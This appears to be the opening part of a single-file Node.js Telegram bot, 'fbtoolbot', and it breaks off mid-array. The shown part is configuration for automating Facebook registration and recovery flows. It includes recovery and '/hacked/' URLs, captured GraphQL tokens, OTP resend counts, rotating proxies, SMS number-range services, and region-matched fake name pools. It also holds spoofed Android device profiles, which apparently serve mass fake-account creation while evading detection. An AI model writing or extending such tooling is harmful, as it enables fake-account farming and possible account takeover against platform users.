#!/usr/bin/env node
'use strict';
/**
 * ============================================================================
 *  fbtoolbot — All-in-One Standalone Single-File Telegram Bot (v8.4)
 * ============================================================================
 *  Zero external npm dependencies! Works in ANY folder (no package.json needed).
 *  Requires only Node.js >= 18 and `curl`.
 *
 *  Quick Start (Any VPS / Render / Railway / Pterodactyl / Termux / PC):
 *    export TELEGRAM_BOT_TOKEN="your_bot_token"
 *    export TELEGRAM_ADMIN_ID="7831629041"
 *    export TELEGRAM_ADMIN_USERNAME="@CODINGJAMES_X"
 *    node fbtoolbot.js
 * ============================================================================
 */

(async () => {
const { default: fs } = await import('node:fs');
const { default: path } = await import('node:path');
const { default: crypto } = await import('node:crypto');
const { default: net } = await import('node:net');
const { default: http } = await import('node:http');
const { default: readline } = await import('node:readline');
const { default: zlib } = await import('node:zlib');
const { spawn } = await import('node:child_process');

const BOT_DIR = process.argv[1] ? path.dirname(path.resolve(process.argv[1])) : process.cwd();

// ----------------------------------------------------------------------------
// 1. CLI Args & Zero-Dep .env Loader
// ----------------------------------------------------------------------------
function parseCliArgs(argv) {
  const out = {};
  for (const arg of argv.slice(2)) {
    if (arg.startsWith('--token=')) out.token = arg.slice('--token='.length).trim();
    else if (arg.startsWith('--admin-id=')) out.adminId = arg.slice('--admin-id='.length).trim();
    else if (arg.startsWith('--admin-user=')) out.adminUser = arg.slice('--admin-user='.length).trim();
    else if (arg.startsWith('--data-dir=')) out.dataDir = arg.slice('--data-dir='.length).trim();
    else if (arg.startsWith('--port=')) out.port = arg.slice('--port='.length).trim();
    else if (arg === '--diag' || arg === '--check') out.diag = true;
  }
  return out;
}

function loadLocalEnvFile(dir) {
  const envPath = path.join(dir, '.env');
  if (!fs.existsSync(envPath)) return;
  try {
    const raw = fs.readFileSync(envPath, 'utf-8');
    for (const line of raw.split(/\r?\n/)) {
      const trimmed = line.trim();
      if (!trimmed || trimmed.startsWith('#')) continue;
      const eq = trimmed.indexOf('=');
      if (eq <= 0) continue;
      const key = trimmed.slice(0, eq).trim();
      let val = trimmed.slice(eq + 1).trim();
      if (
        (val.startsWith('"') && val.endsWith('"')) ||
        (val.startsWith("'") && val.endsWith("'"))
      ) {
        val = val.slice(1, -1);
      }
      if (key && !(key in process.env)) {
        process.env[key] = val;
      }
    }
  } catch {
    // ignore malformed .env
  }
}

loadLocalEnvFile(BOT_DIR);
const CLI = parseCliArgs(process.argv);

const DEFAULT_ADMIN_ID = (CLI.adminId || process.env.TELEGRAM_ADMIN_ID || '7831629041').trim();
const DEFAULT_ADMIN_USERNAME = (CLI.adminUser || process.env.TELEGRAM_ADMIN_USERNAME || '@CODINGJAMES_X').trim();
const DEFAULT_OWNER_URL = (process.env.TELEGRAM_OWNER_URL || 'https://t.me/CODINGJAMES_X').trim();
const DEFAULT_CHANNEL_URL = (process.env.TELEGRAM_CHANNEL_URL || 'https://t.me/EarnAirdropX').trim();
const DEFAULT_BRAND_NAME = (process.env.BOT_BRAND_NAME || 'JEME').trim();

const DATA_ROOT = path.resolve(
  CLI.dataDir || process.env.FBTOOLS_DATA_DIR || path.join(BOT_DIR, 'fbtoolbot_data')
);
if (!fs.existsSync(DATA_ROOT)) {
  fs.mkdirSync(DATA_ROOT, { recursive: true });
}

const FILES = {
  proxies: path.join(DATA_ROOT, 'global_proxies.txt'),
  debugLog: path.join(DATA_ROOT, 'system_debug.log'),
  botSettings: path.join(DATA_ROOT, 'bot_settings.json'),
  botUsers: path.join(DATA_ROOT, 'bot_users.json'),
  botUsersDir: path.join(DATA_ROOT, 'users'),
  adminCountries: path.join(DATA_ROOT, 'admin_countries.json'),
  adminPanels: path.join(DATA_ROOT, 'admin_panels.json'),
};
if (!fs.existsSync(FILES.botUsersDir)) {
  fs.mkdirSync(FILES.botUsersDir, { recursive: true });
}

// ----------------------------------------------------------------------------
// 2. Engine Constants & Utilities
// ----------------------------------------------------------------------------
const PC_RECOVERY_PRESETS = [
  { id: 'limited_identify', label: 'limited.../login/identify/', url: 'https://limited.facebook.com/login/identify/?ctx=recover' },
  { id: 'www_identify', label: 'www.../login/identify/', url: 'https://www.facebook.com/login/identify/' },
  { id: 'm_login', label: 'm.../login/', url: 'https://m.facebook.com/login/' },
  { id: 'www_hacked', label: 'www.../hacked/', url: 'https://www.facebook.com/hacked/' },
  { id: 'm_identify', label: 'm.../login/identify/', url: 'https://m.facebook.com/login/identify/?ctx=recover' },
];

const PC_FB_ALLOWED_HOSTS = new Set([
  'facebook.com',
  'www.facebook.com',
  'm.facebook.com',
  'mbasic.facebook.com',
  'limited.facebook.com',
  'touch.facebook.com',
  'web.facebook.com',
]);

function normalizePcRecoveryUrls(input, { fallbackToDefaults = true } = {}) {
  const rawItems = Array.isArray(input)
    ? input
    : String(input || '')
        .split(/[\r\n,\s|]+/)
        .map((s) => s.trim())
        .filter(Boolean);
  const out = [];
  const seen = new Set();
  for (const item of rawItems) {
    let candidate = String(item || '').trim();
    if (!candidate) continue;
    if (!/^https?:\/\//i.test(candidate)) {
      if (/^(?:www\.|m\.|mbasic\.|touch\.|web\.)?facebook\.com\//i.test(candidate)) {
        candidate = `https://${candidate}`;
      } else {
        continue;
      }
    }
    try {
      const parsed = new URL(candidate);
      if (parsed.protocol !== 'https:') continue;
      const host = parsed.hostname.toLowerCase();
      if (!PC_FB_ALLOWED_HOSTS.has(host)) continue;
      parsed.hash = '';
      if (!parsed.pathname) parsed.pathname = '/';
      const finalUrl = parsed.toString();
      if (!seen.has(finalUrl)) {
        seen.add(finalUrl);
        out.push(finalUrl);
      }
      if (out.length >= 8) break;
    } catch {
      // ignore invalid URL
    }
  }
  if (out.length === 0 && fallbackToDefaults) {
    return PC_RECOVERY_PRESETS.slice(0, 4).map((p) => p.url);
  }
  return out;
}

const DEFAULT_CONFIG = {
  password: '',
  cc: '880',
  proxy: '',
  delay: 1,
  retries: 4,
  timeout: 18,
  threads: 4,
  skip_probe: true,
  fresh_id: true,
  strict_proxy: true,
  precheck_gql: true,
  proxy_saver: true,
  gql_via_direct: true,
  checker_use_proxy: false,
  auto_proxy_refresh: true,
  auto_proxy_country: true,
  auto_otp_resend: 2,
  pc_otp_resends: 3,
  pc_recovery_urls: PC_RECOVERY_PRESETS.slice(0, 4).map((p) => p.url),
  engine_mode: 'hybrid',
  proxy_mode: 'rotate',
  lamix_token: '',
  fb_create_country_id: null,
  fb_tools_password: '',
  fb_tools_source: '2oo9',
  fb_tools_2oo9_keys: [],
  fb_tools_2oo9_range: '',
  fb_tools_2oo9_range_label: '',
  fb_tools_2oo9_sid: '',
  fb_tools_lamix_range: '',
  fb_tools_lamix_label: '',
  fb_tools_lamix_prefix: '',
  fb_tools_country_id: null,
  fb_tools_human_delay: false,
  fb_tools_otp_resends: 5,
  fb_tools_auto_replace: true,
  batch: 0,
  resume_mode: true,
};

const FB_REG_BASE = 'https://limited.facebook.com';
const FB_GRAPHQL_URL = 'https://www.facebook.com/api/graphql/';
const DEFAULT_FB_LSD = 'AdS-QY2mYrCcHP7sVf7ynTA6vTc';
const DEFAULT_GQL_CIPHER =
  'AdAtB3O832KrYgWu2c7Jm2mNWOdAALA9wNFKJ_043RSsW27RSXXjhlBd0Cr8rGn-' +
  'lIwgDuQU-CNQILiqKbqFW0GZop7nLgDVhClntKlePmNpHzT4ESf47v-lTUCNV3L-' +
  'ikw70LhayHi30trSUJqk-Rvmaost-m0CTl60dFiIcbLNhGmQ8uggs-M1wfu04K' +
  'QJvOQBDLwohSr7f_yRqkDGj98Ra-1S2N77k17Fqxu8N84cEWWTyv4qW6ySj7GI' +
  '7CYYhD8QZDTzMxXcImxAr_Y';
const DEFAULT_GQL_JAZOEST = '22291';
const DEFAULT_GQL_DOC_ID = '27012969198380071';

const COUNTRY_MAP = {
  '880': ['Bangladesh', 'BD'],
  '91': ['India', 'IN'],
  '92': ['Pakistan', 'PK'],
  '1': ['United States', 'US'],
  '44': ['United Kingdom', 'GB'],
  '61': ['Australia', 'AU'],
  '64': ['New Zealand', 'NZ'],
  '62': ['Indonesia', 'ID'],
  '60': ['Malaysia', 'MY'],
  '65': ['Singapore', 'SG'],
  '63': ['Philippines', 'PH'],
  '84': ['Vietnam', 'VN'],
  '66': ['Thailand', 'TH'],
  '855': ['Cambodia', 'KH'],
  '856': ['Laos', 'LA'],
  '852': ['Hong Kong', 'HK'],
  '886': ['Taiwan', 'TW'],
  '95': ['Myanmar', 'MM'],
  '94': ['Sri Lanka', 'LK'],
  '977': ['Nepal', 'NP'],
  '975': ['Bhutan', 'BT'],
  '960': ['Maldives', 'MV'],
  '93': ['Afghanistan', 'AF'],
  '98': ['Iran', 'IR'],
  '964': ['Iraq', 'IQ'],
  '963': ['Syria', 'SY'],
  '962': ['Jordan', 'JO'],
  '961': ['Lebanon', 'LB'],
  '970': ['Palestine', 'PS'],
  '966': ['Saudi Arabia', 'SA'],
  '971': ['UAE', 'AE'],
  '967': ['Yemen', 'YE'],
  '968': ['Oman', 'OM'],
  '965': ['Kuwait', 'KW'],
  '974': ['Qatar', 'QA'],
  '973': ['Bahrain', 'BH'],
  '90': ['Turkey', 'TR'],
  '86': ['China', 'CN'],
  '81': ['Japan', 'JP'],
  '82': ['South Korea', 'KR'],
  '976': ['Mongolia', 'MN'],
  '992': ['Tajikistan', 'TJ'],
  '993': ['Turkmenistan', 'TM'],
  '994': ['Azerbaijan', 'AZ'],
  '995': ['Georgia', 'GE'],
  '996': ['Kyrgyzstan', 'KG'],
  '998': ['Uzbekistan', 'UZ'],
  '7': ['Russia', 'RU'],
  '380': ['Ukraine', 'UA'],
  '375': ['Belarus', 'BY'],
  '374': ['Armenia', 'AM'],
  '373': ['Moldova', 'MD'],
  '33': ['France', 'FR'],
  '34': ['Spain', 'ES'],
  '39': ['Italy', 'IT'],
  '49': ['Germany', 'DE'],
  '31': ['Netherlands', 'NL'],
  '32': ['Belgium', 'BE'],
  '41': ['Switzerland', 'CH'],
  '43': ['Austria', 'AT'],
  '45': ['Denmark', 'DK'],
  '46': ['Sweden', 'SE'],
  '47': ['Norway', 'NO'],
  '48': ['Poland', 'PL'],
  '30': ['Greece', 'GR'],
  '36': ['Hungary', 'HU'],
  '40': ['Romania', 'RO'],
  '351': ['Portugal', 'PT'],
  '353': ['Ireland', 'IE'],
  '358': ['Finland', 'FI'],
  '359': ['Bulgaria', 'BG'],
  '370': ['Lithuania', 'LT'],
  '371': ['Latvia', 'LV'],
  '372': ['Estonia', 'EE'],
  '381': ['Serbia', 'RS'],
  '385': ['Croatia', 'HR'],
  '420': ['Czechia', 'CZ'],
  '421': ['Slovakia', 'SK'],
  '20': ['Egypt', 'EG'],
  '211': ['South Sudan', 'SS'],
  '212': ['Morocco', 'MA'],
  '213': ['Algeria', 'DZ'],
  '216': ['Tunisia', 'TN'],
  '218': ['Libya', 'LY'],
  '220': ['Gambia', 'GM'],
  '221': ['Senegal', 'SN'],
  '222': ['Mauritania', 'MR'],
  '223': ['Mali', 'ML'],
  '224': ['Guinea', 'GN'],
  '225': ['Ivory Coast', 'CI'],
  '226': ['Burkina Faso', 'BF'],
  '227': ['Niger', 'NE'],
  '228': ['Togo', 'TG'],
  '229': ['Benin', 'BJ'],
  '230': ['Mauritius', 'MU'],
  '231': ['Liberia', 'LR'],
  '232': ['Sierra Leone', 'SL'],
  '233': ['Ghana', 'GH'],
  '234': ['Nigeria', 'NG'],
  '235': ['Chad', 'TD'],
  '236': ['Central African Rep.', 'CF'],
  '237': ['Cameroon', 'CM'],
  '238': ['Cape Verde', 'CV'],
  '240': ['Equatorial Guinea', 'GQ'],
  '241': ['Gabon', 'GA'],
  '242': ['Congo', 'CG'],
  '243': ['DR Congo', 'CD'],
  '244': ['Angola', 'AO'],
  '245': ['Guinea-Bissau', 'GW'],
  '248': ['Seychelles', 'SC'],
  '249': ['Sudan', 'SD'],
  '250': ['Rwanda', 'RW'],
  '251': ['Ethiopia', 'ET'],
  '252': ['Somalia', 'SO'],
  '253': ['Djibouti', 'DJ'],
  '254': ['Kenya', 'KE'],
  '255': ['Tanzania', 'TZ'],
  '256': ['Uganda', 'UG'],
  '257': ['Burundi', 'BI'],
  '258': ['Mozambique', 'MZ'],
  '260': ['Zambia', 'ZM'],
  '261': ['Madagascar', 'MG'],
  '263': ['Zimbabwe', 'ZW'],
  '264': ['Namibia', 'NA'],
  '265': ['Malawi', 'MW'],
  '266': ['Lesotho', 'LS'],
  '267': ['Botswana', 'BW'],
  '268': ['Eswatini', 'SZ'],
  '269': ['Comoros', 'KM'],
  '27': ['South Africa', 'ZA'],
  '291': ['Eritrea', 'ER'],
  '51': ['Peru', 'PE'],
  '52': ['Mexico', 'MX'],
  '53': ['Cuba', 'CU'],
  '54': ['Argentina', 'AR'],
  '55': ['Brazil', 'BR'],
  '56': ['Chile', 'CL'],
  '57': ['Colombia', 'CO'],
  '58': ['Venezuela', 'VE'],
  '502': ['Guatemala', 'GT'],
  '503': ['El Salvador', 'SV'],
  '504': ['Honduras', 'HN'],
  '505': ['Nicaragua', 'NI'],
  '506': ['Costa Rica', 'CR'],
  '507': ['Panama', 'PA'],
  '591': ['Bolivia', 'BO'],
  '593': ['Ecuador', 'EC'],
  '595': ['Paraguay', 'PY'],
  '598': ['Uruguay', 'UY'],
};

const COUNTRY_NAME_TO_ISO = {
  uk: 'GB',
  'united kingdom': 'GB',
  'great britain': 'GB',
  england: 'GB',
  usa: 'US',
  'united states': 'US',
  'united states of america': 'US',
  uae: 'AE',
  'united arab emirates': 'AE',
  "cote d'ivoire": 'CI',
  'cote divoire': 'CI',
  'ivory coast': 'CI',
  'dr congo': 'CD',
  'democratic republic of the congo': 'CD',
  'republic of the congo': 'CG',
  'central african republic': 'CF',
  'south korea': 'KR',
  'korea': 'KR',
  'czech republic': 'CZ',
  czechia: 'CZ',
  'russian federation': 'RU',
  vietnam: 'VN',
  'viet nam': 'VN',
  laos: 'LA',
  tanzania: 'TZ',
  'united republic of tanzania': 'TZ',
  iran: 'IR',
  syria: 'SY',
  moldova: 'MD',
  bolivia: 'BO',
  venezuela: 'VE',
  palestine: 'PS',
  eswatini: 'SZ',
  swaziland: 'SZ',
};

for (const [name, iso] of Object.values(COUNTRY_MAP)) {
  const k = String(name || '').toLowerCase().trim();
  if (k && iso && !(k in COUNTRY_NAME_TO_ISO)) {
    COUNTRY_NAME_TO_ISO[k] = iso;
  }
}

function countryNameToIso(name) {
  const clean = String(name || '').toLowerCase().replace(/[^a-z0-9\s']/g, ' ').replace(/\s+/g, ' ').trim();
  if (!clean) return '';
  if (COUNTRY_NAME_TO_ISO[clean]) return COUNTRY_NAME_TO_ISO[clean];
  for (const [k, iso] of Object.entries(COUNTRY_NAME_TO_ISO)) {
    if (clean.includes(k) && k.length >= 4) return iso;
  }
  return '';
}

function getCountryInfo(cleanNum) {
  const s = String(cleanNum || '').replace(/\D/g, '');
  if (s.startsWith('76') || s.startsWith('77')) return ['Kazakhstan', 'KZ'];
  for (const len of [3, 2, 1]) {
    const p = s.slice(0, len);
    if (COUNTRY_MAP[p]) return COUNTRY_MAP[p];
  }
  return ['Unknown', '??'];
}

function isoToFlag(iso) {
  const code = String(iso || '').trim().toUpperCase();
  if (!/^[A-Z]{2}$/.test(code)) return '🌐';
  return String.fromCodePoint(
    0x1f1e6 + (code.charCodeAt(0) - 65),
    0x1f1e6 + (code.charCodeAt(1) - 65)
  );
}

const CC_INFO = {
  '880': [10, '0'], '91': [10, '0'], '92': [10, '0'], '93': [9, '0'],
  '94': [9, '0'], '977': [10, '0'], '975': [8, ''], '960': [7, ''], '1': [10, '1'],
  '44': [10, '0'], '61': [9, '0'], '64': [9, '0'], '62': [10, '0'], '60': [9, '0'],
  '65': [8, ''], '66': [9, '0'], '84': [9, '0'], '63': [10, '0'],
  '81': [10, '0'], '82': [10, '0'], '86': [11, '0'], '95': [9, '0'],
  '852': [8, ''], '886': [9, '0'], '855': [9, '0'], '856': [10, '0'],
  '971': [9, '0'], '966': [9, '0'], '974': [8, ''], '965': [8, ''],
  '968': [8, ''], '973': [8, ''], '967': [9, '0'], '970': [9, '0'],
  '964': [10, '0'], '963': [9, '0'], '962': [9, '0'], '961': [8, '0'],
  '976': [8, ''], '992': [9, ''], '993': [8, ''], '994': [9, '0'],
  '995': [9, '0'], '996': [9, '0'], '998': [9, ''],
  '20': [10, '0'], '211': [9, '0'], '234': [10, '0'], '254': [9, '0'],
  '255': [9, '0'], '256': [9, '0'], '251': [9, '0'], '250': [9, '0'],
  '252': [8, '0'], '253': [8, ''], '257': [8, ''], '258': [9, '0'],
  '27': [9, '0'], '233': [9, '0'], '237': [9, ''], '242': [9, ''],
  '243': [9, '0'], '260': [9, '0'], '261': [9, '0'], '263': [9, '0'],
  '264': [9, '0'], '265': [9, '0'], '267': [8, ''], '249': [9, '0'],
  '244': [9, '0'], '212': [9, '0'], '213': [9, '0'], '216': [8, ''],
  '218': [9, '0'], '221': [9, ''], '223': [8, ''], '224': [9, ''],
  '225': [10, ''], '226': [8, ''], '227': [8, ''], '228': [8, ''],
  '229': [8, ''], '230': [8, ''], '231': [8, '0'], '232': [8, '0'],
  '235': [8, ''], '220': [7, ''], '222': [8, ''], '90': [10, '0'],
  '98': [10, '0'], '7': [10, '8'], '380': [9, '0'], '375': [9, '0'],
  '374': [8, '0'], '373': [8, '0'], '30': [10, ''], '31': [9, '0'],
  '32': [9, '0'], '33': [9, '0'], '34': [9, ''], '36': [9, '0'],
  '39': [10, ''], '40': [9, '0'], '41': [9, '0'], '43': [10, '0'],
  '45': [8, ''], '46': [9, '0'], '47': [8, ''], '48': [9, ''],
  '49': [10, '0'], '351': [9, ''], '353': [9, '0'], '358': [9, '0'],
  '359': [9, '0'], '420': [9, ''], '51': [9, ''], '52': [10, ''],
  '53': [8, ''], '54': [10, '0'], '55': [11, '0'], '56': [9, ''],
  '57': [10, '0'], '58': [10, '0'], '502': [8, ''], '503': [8, ''],
  '504': [8, ''], '505': [8, ''], '506': [8, ''], '507': [8, ''],
  '591': [8, ''], '593': [9, '0'], '595': [9, '0'], '598': [8, '0'],
};

const FIRST_NAMES_POOL = [
  'Arafat', 'Rakib', 'Sabbir', 'Nayeem', 'Rifat', 'Tanvir', 'Shakib',
  'Sajid', 'Nahid', 'Rasel', 'Sohel', 'Hasan', 'Fahim', 'Arman', 'Jahid',
  'Miraj', 'Rony', 'Sifat', 'Akash', 'Bappy', 'Anik', 'Ayon', 'Tuhin',
  'Sagar', 'Riad', 'Sohan', 'Imran', 'Foysal', 'Mahin', 'Sajib', 'Rahim',
  'Karim', 'Naim', 'Rayhan', 'Jubayer', 'Tahmid', 'Aditto', 'Ridoy',
  'Shanto', 'Rana', 'David', 'John', 'Michael', 'Daniel', 'Kevin',
  'Rayan', 'Adam', 'Liam', 'Noah', 'Ethan', 'Sami', 'Ali', 'Omar',
  'Yusuf', 'Bilal', 'Hamza', 'Ibrahim', 'Zayan', 'Rehan', 'Aayan',
  'Juma', 'Baraka', 'Amani', 'Hassan', 'Kelvin', 'Samuel', 'Joseph', 'Musa',
];
const FIRST_F = [
  'Sadia', 'Nusrat', 'Tasnim', 'Mim', 'Rima', 'Sumaiya', 'Farhana',
  'Jannat', 'Ayesha', 'Sanjida', 'Mitu', 'Popy', 'Shorna', 'Laboni',
  'Tania', 'Sraboni', 'Nipa', 'Anika', 'Munia', 'Joya', 'Amina', 'Fatuma',
  'Neema', 'Rehema', 'Zainab', 'Halima', 'Mariam', 'Grace', 'Sarah', 'Hannah',
];
const LAST_N = [
  'Hossain', 'Ahmed', 'Khan', 'Islam', 'Rahman', 'Sarker', 'Mia', 'Ali',
  'Sheikh', 'Chowdhury', 'Talukder', 'Molla', 'Howlader', 'Sikder',
  'Uddin', 'Akter', 'Sultana', 'Begum', 'Rana', 'Roy', 'Das', 'Dey',
  'Paul', 'Biswas', 'Kumar', 'Sharma', 'Patel', 'Singh', 'Mahmud',
  'Mwangi', 'Juma', 'Bakari', 'Mohamed', 'Omari', 'Hamisi', 'Kassim', 'Salim',
];

const REGION_FIRST_NAMES = {
  '255': ['Juma', 'Baraka', 'Amani', 'Hassan', 'Bakari', 'Salim', 'Kassim', 'Hamisi', 'Omari', 'Rajabu', 'Neema', 'Amina', 'Fatuma', 'Halima', 'Rehema', 'Zainab', 'Grace', 'Kelvin'],
  '254': ['Brian', 'Kevin', 'Dennis', 'Samuel', 'David', 'Faith', 'Mercy', 'Grace', 'Esther', 'Collins', 'Victor', 'Amani'],
  '256': ['Ivan', 'Ronald', 'Moses', 'Denis', 'Patrick', 'Sarah', 'Grace', 'Prossy', 'Ritah', 'Brian'],
  '234': ['Chinedu', 'Emeka', 'Tunde', 'Sadiq', 'Ibrahim', 'Amina', 'Zainab', 'Blessing', 'Femi', 'Kola', 'Samuel'],
  '233': ['Kwame', 'Kofi', 'Yaw', 'Kojo', 'Samuel', 'Abena', 'Akosua', 'Ama', 'Esi', 'Daniel'],
  '225': ['Kouassi', 'Koffi', 'Yao', 'Moussa', 'Ibrahim', 'Awa', 'Fatoumata', 'Mariam', 'Aminata', 'Adama'],
  '221': ['Mamadou', 'Ibrahima', 'Ousmane', 'Cheikh', 'Moussa', 'Awa', 'Fatou', 'Aminata', 'Mariama'],
  '237': ['Jean', 'Paul', 'Samuel', 'franck', 'Eric', 'Nadine', 'Marie', 'Christelle', 'Alain'],
  '212': ['Youssef', 'Amine', 'Mehdi', 'Karim', 'Omar', 'Salma', 'Fatima', 'Khadija', 'Nadia'],
  '213': ['Yacine', 'Amine', 'Karim', 'Sofiane', 'Mehdi', 'Meriem', 'Yasmine', 'Sarah', 'Nour'],
  '20': ['Ahmed', 'Mohamed', 'Mahmoud', 'Omar', 'Youssef', 'Mostafa', 'Nour', 'Mariam', 'Salma', 'Sara'],
  '880': ['Arafat', 'Rakib', 'Sabbir', 'Nayeem', 'Rifat', 'Tanvir', 'Shakib', 'Sajid', 'Nahid', 'Rasel', 'Hasan', 'Fahim', 'Jahid', 'Nusrat', 'Sadia', 'Tasnim', 'Farhana', 'Jannat'],
  '91': ['Aarav', 'Rohan', 'Vikram', 'Rahul', 'Aditya', 'Arjun', 'Ananya', 'Priya', 'Neha', 'Karan', 'Amit'],
  '92': ['Hamza', 'Bilal', 'Usman', 'Zain', 'Saad', 'Ayesha', 'Fatima', 'Hira', 'Ali', 'Umar'],
  '62': ['Budi', 'Rizky', 'Fajar', 'Dimas', 'Putra', 'Siti', 'Dewi', 'Nisa', 'Andi', 'Bagus'],
  '60': ['Aiman', 'Hakim', 'Danish', 'Faris', 'Hafiz', 'Nurul', 'Aisyah', 'Siti', 'amir'],
  '63': ['John', 'Mark', 'Carlo', 'Paolo', 'Joshua', 'Maria', 'Angela', 'Bea', 'Camille'],
  '84': ['Minh', 'Anh', 'Huy', 'Duc', 'Tuan', 'Linh', 'Trang', 'Huong', 'Thao', 'Nam'],
  '66': ['Somchai', 'Nattapong', 'Kittisak', 'Thanakorn', 'Ploy', 'Pim', 'Nok', 'May'],
  '90': ['Emre', 'Mehmet', 'Ahmet', 'Can', 'Burak', 'Elif', 'Zeynep', 'Merve', 'Yusuf'],
  '966': ['Abdullah', 'Faisal', 'Khalid', 'Salman', 'Omar', 'Noura', 'Sara', 'Reem', 'Fahad'],
  '1': ['Liam', 'Noah', 'Ethan', 'Lucas', 'Mason', 'Emma', 'Olivia', 'Ava', 'Sophia', 'Daniel'],
  '44': ['Oliver', 'George', 'Harry', 'Jack', 'Charlie', 'Amelia', 'Isla', 'Ava', 'Mia', 'Emily'],
  '33': ['Lucas', 'Hugo', 'Louis', 'Nathan', 'Leo', 'Emma', 'Chloe', 'Camille', 'Lea'],
  '49': ['Lukas', 'Jonas', 'Felix', 'Maximilian', 'Paul', 'Anna', 'Lena', 'Mia', 'Hannah'],
  '34': ['Mateo', 'Lucas', 'Hugo', 'Daniel', 'Pablo', 'Lucia', 'Sofia', 'Paula', 'Maria'],
  '39': ['Lorenzo', 'Matteo', 'Leonardo', 'Alessandro', 'Francesco', 'Sofia', 'Giulia', 'Aurora', 'Alice'],
  '855': ['Sokha', 'Dara', 'Vanna', 'Bopha', 'Piseth', 'Rithy', 'Sreypov', 'Chantha'],
  '55': ['Gabriel', 'Lucas', 'Matheus', 'Pedro', 'Rafael', 'Julia', 'Mariana', 'Beatriz', 'Camila'],
};
const REGION_LAST_NAMES = {
  '255': ['Juma', 'Bakari', 'Omari', 'Hamisi', 'Kassim', 'Salim', 'Mohamed', 'Hassan', 'Mushi', 'Massawe', 'Ally', 'Rajabu', 'Rashid'],
  '254': ['Mwangi', 'Kamau', 'Ochieng', 'Otieno', 'Njoroge', 'Wanjiku', 'Kiprop', 'Mutua'],
  '256': ['Kato', 'Okello', 'Ssempijja', 'Mukasa', 'Byaruhanga', 'Namukasa', 'Ouma'],
  '234': ['Okafor', 'Adeyemi', 'Babatunde', 'Ibrahim', 'Musa', 'Balogun', 'Chukwu', 'Sani'],
  '233': ['Mensah', 'Boateng', 'Owusu', 'Appiah', 'Osei', 'Agyemang', 'Asante'],
  '225': ['Kouame', 'Kone', 'Coulibaly', 'Traore', 'Diallo', 'Bamba', 'Toure', 'Yao'],
  '221': ['Diop', 'Ndiaye', 'Fall', 'Faye', 'Diallo', 'Ba', 'Sow', 'Gueye'],
  '237': ['Nkono', 'Tchatchoua', 'Mbarga', 'Fouda', 'Ndi', 'Bikoi', 'Kamga'],
  '212': ['El Amrani', 'Bennani', 'Tazi', 'Idrissi', 'Chraibi', 'Alaoui'],
  '213': ['Benali', 'Mansouri', 'Khelifi', 'Brahimi', 'Ziani', 'Boudiaf'],
  '20': ['Hassan', 'Ibrahim', 'Mohamed', 'Ali', 'Mahmoud', 'El-Sayed', 'Mansour'],
  '880': ['Hossain', 'Ahmed', 'Khan', 'Islam', 'Rahman', 'Sarker', 'Mia', 'Sheikh', 'Chowdhury', 'Talukder', 'Molla', 'Biswas', 'Mahmud'],
  '91': ['Sharma', 'Patel', 'Singh', 'Kumar', 'Verma', 'Gupta', 'Roy', 'Das', 'Nair', 'Reddy'],
  '92': ['Khan', 'Ahmed', 'Malik', 'Sheikh', 'Qureshi', 'Raza', 'Siddiqui', 'Ali'],
  '62': ['Saputra', 'Pratama', 'Wijaya', 'Santoso', 'Hidayat', 'Putri', 'Lestari'],
  '60': ['Ahmad', 'Abdullah', 'Rahman', 'Ismail', 'Hassan', 'Zainal', 'Ibrahim'],
  '63': ['Santos', 'Reyes', 'Cruz', 'Bautista', 'Garcia', 'Mendoza', 'Torres'],
  '84': ['Nguyen', 'Tran', 'Le', 'Pham', 'Hoang', 'Vu', 'Dang', 'Bui'],
  '90': ['Yilmaz', 'Kaya', 'Demir', 'Sahin', 'Celik', 'Yildiz', 'Ozturk'],
  '44': ['Smith', 'Jones', 'Taylor', 'Brown', 'Williams', 'Wilson', 'Davies'],
  '1': ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Miller', 'Davis'],
  '33': ['Martin', 'Bernard', 'Thomas', 'Petit', 'Robert', 'Richard', 'Durand'],
  '49': ['Muller', 'Schmidt', 'Schneider', 'Fischer', 'Weber', 'Meyer', 'Wagner'],
  '34': ['Garcia', 'Martinez', 'Lopez', 'Sanchez', 'Gonzalez', 'Rodriguez'],
  '39': ['Rossi', 'Russo', 'Ferrari', 'Esposito', 'Bianchi', 'Romano', 'Colombo', 'Ricci'],
  '855': ['Sok', 'Chan', 'Chea', 'Khun', 'Ly', 'Phan', 'Meas', 'Keo'],
  '55': ['Silva', 'Santos', 'Oliveira', 'Souza', 'Pereira', 'Costa', 'Rodrigues'],
};

const ANDROID_DEVICES = [
  ['SM-A035F', 'samsung', 'a03', '12'], ['SM-A045F', 'samsung', 'a04s', '12'],
  ['SM-A055F', 'samsung', 'a05', '13'], ['SM-A065F', 'samsung', 'a06', '14'],
  ['SM-A125F', 'samsung', 'a12', '11'], ['SM-A135F', 'samsung', 'a13', '12'],
  ['SM-A145F', 'samsung', 'a14', '13'], ['SM-A155F', 'samsung', 'a15', '14'],
  ['SM-A235F', 'samsung', 'a23', '12'], ['SM-A245F', 'samsung', 'a24', '13'],
  ['SM-A336E', 'samsung', 'a33', '12'], ['SM-A346E', 'samsung', 'a34', '13'],
  ['SM-A525F', 'samsung', 'a52', '11'], ['SM-A536E', 'samsung', 'a53', '12'],
  ['SM-A546E', 'samsung', 'a54', '13'], ['SM-A556E', 'samsung', 'a55', '14'],
  ['SM-G991B', 'samsung', 'o1s', '11'], ['SM-S901E', 'samsung', 'r0s', '12'],
  ['SM-S911B', 'samsung', 'dm1q', '13'], ['SM-S921B', 'samsung', 'e1q', '14'],
  ['SM-M135F', 'samsung', 'm13', '12'], ['SM-M146B', 'samsung', 'm14', '13'],
  ['SM-M336B', 'samsung', 'm33', '12'], ['SM-M546B', 'samsung', 'm54', '13'],
  ['M2101K6G', 'Xiaomi', 'sweet', '11'], ['2201117TG', 'Xiaomi', 'spes', '12'],
  ['22021211RG', 'Xiaomi', 'fog', '12'], ['23021RAAEG', 'Xiaomi', 'topaz', '13'],
  ['23106RN0DA', 'Xiaomi', 'gale', '13'], ['Redmi Note 11', 'Xiaomi', 'spes', '11'],
  ['Redmi Note 12', 'Xiaomi', 'tapas', '13'], ['Redmi Note 13', 'Xiaomi', 'sapphire', '13'],
  ['Redmi 12C', 'Xiaomi', 'earth', '12'], ['Redmi 13C', 'Xiaomi', 'gale', '13'],
  ['POCO M5', 'Xiaomi', 'rock', '12'], ['POCO X5 Pro', 'Xiaomi', 'redwood', '12'],
  ['CPH2339', 'OPPO', 'A17', '12'], ['CPH2461', 'OPPO', 'A58', '13'],
  ['CPH2487', 'OPPO', 'A78', '13'], ['CPH2525', 'OPPO', 'A18', '13'],
